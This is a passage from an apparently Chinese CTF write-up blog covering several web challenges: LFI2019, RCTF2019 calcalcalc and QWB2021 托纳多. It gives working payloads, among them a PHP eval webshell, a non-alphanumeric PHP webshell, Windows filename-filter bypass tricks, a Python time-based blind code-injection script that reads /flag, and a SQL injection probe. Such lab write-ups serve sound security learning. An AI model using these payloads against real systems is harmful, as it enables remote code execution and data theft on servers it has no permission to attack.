+&lt;p>我们的攻击思路是上传一个txt，之后通过back生成后缀为php的备份文件，拿webshell；构造payload&lt;/p>
+&lt;p>amiz.txt&lt;/p>
+&lt;pre tabindex="0">&lt;code>{${eval($_GET[1])}}
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>GET /private/mKrZmVugUo.php?password=4lsUOHWN&amp;amp;1=system('cat /flag.txt');
+&lt;/code>&lt;/pre>&lt;p>flag{913c1949-edef-4459-8ffc-7970b9c93f14}&lt;/p>
+&lt;p>注意这里页面上传的时候要双击submit才会弹出文件管理器&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[Windows]LFI2019
+&lt;/h4>
+&lt;/summary>
+&lt;p>开幕雷击，直接就是phpinfo的背景，显示是一个windows系统，没有&lt;code>disable_functions&lt;/code>也没有&lt;code>open_basedir&lt;/code>&lt;/p>
+&lt;p>有三个按钮，info提示flag在flag.php，upload可以上传文件，include可以包含；给了源码，还挺长的，二百多行&lt;/p>
+&lt;p>大多是一些基础操作，防xss, ssrf, session，有几个类比较显眼，首先是Get，它是include时调用的类，会new一个实例然后调用其中的&lt;code>get&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Get&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">nanahira&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#75715e">// senpai notice me //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$exploit&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">System&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;trigger&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!@@@@@@@@@@@@@&lt;/span>&lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$$$$$$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;leak&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;leak&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;blocked by path sanitizer&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// wtf???? //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!@&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;span style="color:#75715e">// index files are *completely* disabled. //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;you cannot include index files!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// hardened sanitizer spawned. thus we sense ambiguity //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$read_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span> &lt;span style="color:#f92672">||&lt;/span>
+&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;request blocked&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// .. and finally, include *un*exploitable file is included. //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid filename (wtf)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中对文件名的waf是&lt;code>path_sanitizer&lt;/code>，黑名单挺狠的&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$harden&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$dir_len&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75715e">// Deny LFI/RFI/XSS //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;~&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;.\\&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;#&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// Deny SSRF and all possible weird bypasses //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_get_wrappers&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">stream_get_transports&lt;/span>&lt;span style="color:#111">());&lt;/span>
+&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">stream_get_filters&lt;/span>&lt;span style="color:#111">());&lt;/span>
+&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$f_len&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f_len&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// Deny length //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir_len&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// Easy level hardening //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$harden&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$harden_filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$harden_filter&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// Sanitize feature is available starting from the medium level //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>$filename&lt;/code>单独经过waf之后得到的文件路径&lt;code>$read_file_with_hardened_filter&lt;/code>必须和之前的&lt;code>$read_file&lt;/code>不同，读到的文件内容也必须不同&lt;/p>
+&lt;p>post的地方用的是Put类，大差不差，多了个对code的waf，&lt;code>code_sanitizer&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">code_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#75715e">// Computer-chan, please don&amp;#39;t speak english. Speak something else! //
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[^&amp;lt;&amp;gt;!@#$%\^&amp;amp;*\_?+\.\-&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">\&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">\=\(\)\[\]\;]/u&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*Nope*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>正常linux下写入&lt;code>test&lt;/code>文件，包含&lt;code>test\&lt;/code>，经过waf之后得到&lt;code>./files/test&lt;/code>，但是处理前的&lt;code>./files/test\&lt;/code>无法读取文件内容，失败&lt;/p>
+&lt;p>这里用到的trick是windows下执行&lt;code>file_get_contents&lt;/code>时会把&lt;code>&amp;quot;&lt;/code>解释为&lt;code>.&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>file_get_contents('test.php') === file_get_contents('test&amp;quot;php')
+&lt;/code>&lt;/pre>&lt;p>利用这个trick，上传文件名为&lt;code>test&lt;/code>，读取文件名为&lt;code>&amp;quot;/test&lt;/code>，过waf后路径为&lt;code>./files/.test&lt;/code>，处理前路径为&lt;code>./files/./test&lt;/code>，可以正常读取文件内容&lt;/p>
+&lt;p>关于shell，继续用p牛的这篇&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?=$_=[];$_=&amp;quot;$_&amp;quot;;$_=$_[(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)+(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)+(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>注意对&lt;code>+&lt;/code>进行url编码&lt;/p>
+&lt;p>flag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}&lt;/p>
+&lt;p>————之后看更多师傅们的wp，发现由于是win的环境还可以有别的trick来利用&lt;/p>
+&lt;p>win下有磁盘流创建目录的方式&lt;/p>
+&lt;p>&lt;img src="https://cdn.nlark.com/yuque/0/2019/png/298354/1572187075689-2a8c066f-5c30-4f23-9f1f-fd564d4f87f1.png#align=left&amp;amp;display=inline&amp;amp;height=208&amp;amp;name=%E5%9B%BE%E7%89%87.png&amp;amp;originHeight=415&amp;amp;originWidth=900&amp;amp;size=248114&amp;amp;status=done&amp;amp;width=450" alt="图片.png">&lt;/p>
+&lt;p>当&lt;code>file_put_contents&lt;/code>传入的文件名为&lt;code>amiz::$INDEX_ALLOCATION&lt;/code>时 就会在当前文件夹下创建一个名为&lt;code>amiz&lt;/code>的文件夹，内容为空&lt;/p>
+&lt;p>我们先用put创建文件夹，再put向这个文件夹下写shell，最后包含这个文件夹下的shell就可以了&lt;/p>
+&lt;p>参考：&lt;a href="https://nikoeurus.github.io/2019/11/04/lfi2019/">wp1&lt;/a> | &lt;a href="https://evoa.me/archives/13/">wp2&lt;/a>&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+*[RCTF2019]calcalcalc
+&lt;/h4>
+&lt;/summary>
+&lt;p>给了源码，离谱，有3个语言的后端，pho nodejs python&amp;hellip;&amp;hellip;..&lt;/p>
+&lt;p>先看前端，frontend/views/index.hbs&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113421152.png" alt="image-20220120113421152">&lt;/p>
+&lt;p>会post方式请求&lt;code>/calculate&lt;/code>，但好像也算不了啥东西，返回201，然后是frontend/src/app.controller.ts&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114124197.png" alt="image-20220120114124197">&lt;/p>
+&lt;p>有一说一ts我看起来好费劲……它还涉及到另外两个文件，calculate.model.ts&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114423330.png" alt="image-20220120114423330">&lt;/p>
+&lt;p>其中用到的&lt;code>@ExpressionValidator&lt;/code>，expresssion.validator.ts&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114452545.png" alt="image-20220120114452545">&lt;/p>
+&lt;p>如果18行的&lt;code>isVip&lt;/code>为false，就会判断长度，我们可以直接传入json，设它为true&lt;/p>
+&lt;p>三个后端都会对我们请求的式子进行运算，但只有三个返回结果一致时才可以通过&lt;/p>
+&lt;p>Python的后端有处理post请求的部分，backend-python/src/app.py&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113740173.png" alt="image-20220120113740173">&lt;/p>
+&lt;p>会将请求的&lt;code>expression&lt;/code>参数进行json处理后&lt;code>eval&lt;/code>，那入手点就在这里了；但是13行的规则比较严苛，我们采用&lt;code>chr()&lt;/code>的方式绕过&lt;/p>
+&lt;p>但是由于它没有明确的回显，并且后端处于内网中不能外带数据，所以采用时间盲注的思想，配合二分的脚本拿flag&lt;/p>
+&lt;p>*由于buuoj的内网环境问题，这里做不了，所以只写一下脚本，等啥时候修复了再回来做（脚本参考guoke师傅的，二分法&lt;/p>
+&lt;p>核心的盲注payload是这个&lt;/p>
+&lt;pre tabindex="0">&lt;code>__import__('time').sleep(5) if (ord(open('/flag','r').read() [str(i)])&amp;gt;str(mid))else 1
+&lt;/code>&lt;/pre>&lt;p>要过waf，所以转为&lt;code>chr()&lt;/code>的形式，外面包一层&lt;code>eval&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>import requests
+import time
+x=''
+def getpayload(num,mid):
+payload=&amp;quot;__import__('time').sleep(5) if (ord(open('/flag','r').read()[&amp;quot;+str(num)+&amp;quot;])&amp;gt;&amp;quot;+str(mid)+&amp;quot;) else 1&amp;quot;
+data=''
+for i in payload:
+data+='chr('+str(ord(i))+')+'
+return('eval('+data[:-1]+')')
+url='xxxx/calculate'
+for a in range(0,60):
+max = 130
+min = 30
+while max &amp;gt;=min:
+mid=(max+min)//2
+payload=getpayload(a,mid)
+time1=time.time()
+r = requests.post(url, json={'isVip': True, 'expression': payload})
+time2=time.time()
+if (time2-time1&amp;gt;5):
+min=mid+1
+else:
+max=mid
+if max==mid==min:
+x+=chr(mid)
+print(str(a)+':'+x)
+break
+&lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%80%83">wp&lt;/a> | &lt;a href="https://guokeya.github.io/post/xUUCnsZ57/">wp2&lt;/a>&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[QWB2021 Quals]托纳多
+&lt;/h4>
+&lt;/summary>
+&lt;p>注册账号登入，但是只有admin才有flag，那肯定得要sqli了，在登录的地方注了半天，结果发现注入点在注册的页面（尴尬），直接单引号就可以闭合&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin'or '1 # 回显this username had been used
+&lt;/code>&lt;/pre>&lt;p>参考官方wp，这里用的是&lt;code>processlist&lt;/code>表，这个表很特别&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120160515099.png" alt="image-20220120160515099">&lt;/p>
+&lt;p>它读取正在执行的sql语句，我们可以通过info列来获得当前的表名列名，还是用祖传的二分法来爆admin的密码&lt;/p>
+&lt;p>（尴尬的是爆一会儿就寄了，害，寄寄寄&lt;/p>
